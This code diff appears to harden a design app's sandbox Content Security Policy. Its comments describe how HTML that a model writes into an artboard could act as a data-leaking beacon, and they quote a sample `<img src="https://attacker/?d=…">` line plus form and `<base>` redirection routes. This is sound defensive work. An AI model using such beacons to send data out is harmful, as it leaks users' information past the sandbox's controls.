@@ -65,10 +65,36 @@ export const PAGE_DOC_SCRIPT_ID = '__mysti_page_doc';
  * The webview path inlines the runtime as text, so no script source-list
  * entries are needed there; `buildPageDocument` widens `script-src` only when
  * the runtime arrives via `<script src>` (see `defaultCspFor`).
+ *
+ * **`https:` is NOT in `img-src`/`font-src`** (Plan 27 lane E, finding E-2).
+ * It used to be, justified as "old pages may use remote images" — but a
+ * `mode: 'html'` artboard is not only *old* content: `insert_page`/`edit_page`
+ * accept `{ mode: 'html', htmlSource }` from a model, `buildPageDocument`
+ * inserts that source RAW into the frame body, and the static-notice fallback
+ * that neuters a legacy page applies to `jsx` only. A scheme-source matches
+ * every host on the internet, so `<img src="https://attacker/?d=…">` in a
+ * model-authored artboard was a working GET beacon — in a coordinator that
+ * has no bash, no fetch and no MCP tool by default. The chat panel closed the
+ * identical hole for injected markdown (media/chat/index.html, Plan 23 B2).
+ *
+ * Nothing legitimate needs the wildcard: canvas assets are content-addressed,
+ * resolved from `asset://` to the webview's own origin, and that origin
+ * arrives as {@link BuildPageDocOptions.imgSources} — which `defaultCspFor`
+ * now honours for legacy frames exactly as it already did for `doc` ones. A
+ * host-side flow that genuinely needs a remote origin names it there; a model
+ * cannot, because `imgSources` is not reachable from any page payload.
+ *
+ * **`form-action 'none'` and `base-uri 'none'`** (Plan 27 lane J, finding
+ * J-5): neither falls back to `default-src`, so without them a model-authored
+ * html artboard could still submit a form to a remote origin or re-point every
+ * relative URL with a `<base>` tag. Nothing in a legacy frame needs either —
+ * the runtime, primitives and harness are inlined script text, and the board
+ * mounts the frame with `sandbox="allow-scripts"` (no `allow-forms`) anyway.
  */
 export const SANDBOX_INNER_CSP =
   "default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; " +
-  "style-src 'unsafe-inline'; img-src data: blob: https:; font-src data: https:; connect-src 'none';";
+  "style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; " +
+  "form-action 'none'; base-uri 'none';";
 
 /**
  * The hardened policy for a **document-first** page (§3.6, "sandbox is a
@@ -88,10 +114,13 @@ export const SANDBOX_INNER_CSP =
  *   `object-src 'none'`** — a design has no forms, no nested frames and no
  *   plugins, so every one of those is a pure exfiltration/navigation surface.
  *
- * Legacy frames deliberately keep {@link SANDBOX_INNER_CSP}: they render
- * pre-existing third-party HTML that may well reference remote images, and
- * tightening them would be a silent content regression rather than a security
- * win on new content.
+ * The `img-src` axis is no longer a difference: {@link SANDBOX_INNER_CSP}
+ * dropped `https:` too (finding E-2), because a legacy `html` artboard is a
+ * shape a MODEL can author, not merely one that arrives off disk — and it
+ * gained `form-action 'none'` / `base-uri 'none'` (finding J-5). What still
+ * separates the two policies is `'unsafe-eval'`, `frame-src 'none'` and
+ * `object-src 'none'` (both of which the legacy policy covers through
+ * `default-src 'none'`).
  */
 export const DOC_SANDBOX_INNER_CSP =
   "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
@@ -221,10 +250,12 @@ const THEME_TOKEN_VALUE_BAD =
  *
  * A custom-property value has a narrow grammar, so this VALIDATES rather than
  * escapes: `;` `{` `}` end the declaration or the rule, and `<` `>` end the
- * `<style>` element itself. `url(` is refused outright because a legacy frame
- * keeps {@link SANDBOX_INNER_CSP} (`img-src … https:`), which would turn a
- * token substituted into an allowlisted `background: var(--theme-color-*)` into
- * a working GET beacon.
+ * `<style>` element itself. `url(` is refused outright: a token substituted
+ * into an allowlisted `background: var(--theme-color-*)` is a fetch the page
+ * did not declare. The frame CSP no longer allows a remote one either (E-2
+ * dropped `https:` from {@link SANDBOX_INNER_CSP}), but the two controls are
+ * independent — `url()` also reaches `data:`/`blob:`, and a caller may name a
+ * real origin through `imgSources`.
  */
 function isSafeThemeTokenValue(value: string): boolean {
   if (typeof value !== 'string') { return false; }
@@ -515,30 +546,36 @@ function defaultCspFor(
     extras.push("'self'", 'file:');
   }
 
+  // Host-named image origins. Legacy frames get these too (finding E-2): with
+  // `https:` gone from `img-src`, the webview's own asset origin is the ONLY
+  // way a resolved `asset://` image paints in a legacy artboard, and it is
+  // named by the host (app.ts), never by a page payload.
+  const imgExtras = [
+    ...(imgSources ?? []).filter(s => CSP_SOURCE_RE.test(s)),
+    ...(extras.includes("'self'") ? ['file:'] : []),
+  ];
+
   if (mode === 'doc') {
     // Document-first frames get the hardened policy: no eval, no remote images.
     let csp = DOC_SANDBOX_INNER_CSP;
     if (extras.length) {
       csp = csp.replace("script-src 'unsafe-inline'", `script-src 'unsafe-inline' ${extras.join(' ')}`);
     }
-    const imgExtras = [
-      ...(imgSources ?? []).filter(s => CSP_SOURCE_RE.test(s)),
-      ...(extras.includes("'self'") ? ['file:'] : []),
-    ];
     if (imgExtras.length) {
       csp = csp.replace('img-src data: blob:', `img-src data: blob: ${imgExtras.join(' ')}`);
     }
     return csp;
   }
 
-  if (extras.length === 0) { return SANDBOX_INNER_CSP; }
-  let csp = SANDBOX_INNER_CSP.replace(
+  if (extras.length === 0 && imgExtras.length === 0) { return SANDBOX_INNER_CSP; }
+  let csp = extras.length === 0 ? SANDBOX_INNER_CSP : SANDBOX_INNER_CSP.replace(
     "script-src 'unsafe-inline' 'unsafe-eval'",
     `script-src 'unsafe-inline' 'unsafe-eval' ${extras.join(' ')}`,
   );
-  if (extras.includes("'self'")) {
-    // Same file://-origin problem for relative image assets in the export.
-    csp = csp.replace('img-src data: blob: https:', 'img-src data: blob: https: file:');
+  if (imgExtras.length) {
+    // `file:` covers the same file://-origin problem for relative image assets
+    // in an export opened from disk.
+    csp = csp.replace('img-src data: blob:', `img-src data: blob: ${imgExtras.join(' ')}`);
   }
   return csp;
 }
